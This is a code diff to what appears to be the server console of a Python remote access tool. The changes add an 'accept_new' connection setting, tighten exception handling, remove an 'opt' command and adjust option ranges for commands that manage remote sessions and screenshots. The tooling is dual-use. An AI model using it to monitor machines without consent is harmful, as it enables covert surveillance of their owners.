@@ -262,7 +262,9 @@ class Connection:
             except OSError:  # occurs when socket is closed
                 break
             else:
-                if address in self.blocked_ips:
+                if not self.user_interface.accept_new:
+                    connection.close()
+                elif address in self.blocked_ips:
                     connection.close()
                 else:
                     aes_key = os.urandom(32)
@@ -287,8 +289,9 @@ class Connection:
                                                     label=None))
             connection.sendall(aes_key_enc)
             return True
-        except:
-            print("exchange keys: error")
+        except socket.error:
+            return False
+        except ValueError:
             return False
 
     # credit: https://stackoverflow.com/questions/1094841/reusable-library-to-get-human-readable-version-of-file-size
@@ -371,10 +374,6 @@ class UserInterface(cmd2.Cmd):
     list_parser = argparse.ArgumentParser(prog="list")
     list_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
 
-    opt_parser = argparse.ArgumentParser(prog="opt")
-    opt_parser.add_argument("-o", "--option", required=True, type=str, help="name of the option to edit")
-    opt_parser.add_argument("-v", "--value", required=True, type=int, help="value to change the option to")
-
     tag_parser = argparse.ArgumentParser(prog="tag")
     tag_parser.add_argument("-t", "--tag", required=True, type=str, help="value to change the tag to")
     tag_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
@@ -403,7 +402,7 @@ class UserInterface(cmd2.Cmd):
     up_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
 
     screen_parser = argparse.ArgumentParser(prog="screen")
-    screen_parser.add_argument("-m", "--monitor", default=-1, type=int, choices=range(-1, 99),
+    screen_parser.add_argument("-m", "--monitor", default=-1, type=int, choices=range(-1, 100),
                                help="monitor to capture (-1 for all)")
     screen_parser.add_argument("-w", "--write", required=True, type=str, help="file to write the picture in")
     screen_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
@@ -450,12 +449,15 @@ class UserInterface(cmd2.Cmd):
         self.cmd_timeout = 15
         self.zip_comp = 1
         self.sock_timeout = 20
+        self.accept_new = True
         # adding some settings
         self.add_settable(cmd2.Settable("cmd_timeout", int, "clientside timeout before returning from a command",
                                         choices=range(3600)))
-        self.add_settable(cmd2.Settable("zip_comp", int, "compression level when creating zip file", choices=range(10)))
+        self.add_settable(cmd2.Settable("zip_comp", int, "compression level when creating zip file",
+                                        choices=range(1, 10)))
         self.add_settable(cmd2.Settable("sock_timeout", int, "serverside timeout for receiving and sending data",
                                         choices=range(3600)))
+        self.add_settable(cmd2.Settable("accept_new", bool, "accept new incoming connections"))
         # delete some builtins
         del cmd2.Cmd.do_py
         del cmd2.Cmd.do_run_pyscript
@@ -465,24 +467,19 @@ class UserInterface(cmd2.Cmd):
         del cmd2.Cmd.do_alias
         del cmd2.Cmd.do_macro
 
-    def poutput(self, msg='', *, end: str = '\n'):
+    def poutput(self, msg="", *, end: str = '\n'):
         super().poutput(msg)
 
-    def pinfo(self, msg=''):
+    def pinfo(self, msg=""):
         super().poutput(f"[*] {msg}")
 
-    def perror(self, msg='', *, end: str = '\n', apply_style: bool = True):
+    def perror(self, msg="", *, end: str = "\n", apply_style: bool = True):
         super().perror(f"[-] {msg}")
 
     @cmd2.decorators.with_argparser(list_parser)
     def do_list(self, args):
         """List connected sessions"""
         self.server.list_sessions(self.server.connection.get_conn_fgoi(args.sessions))
-
-    @cmd2.decorators.with_argparser(opt_parser)
-    def do_opt(self, args):
-        """Edit option value"""
-        self.server.set_option(args.option, args.value)
 
     @cmd2.decorators.with_argparser(exit_parser)
     def do_exit(self, _):
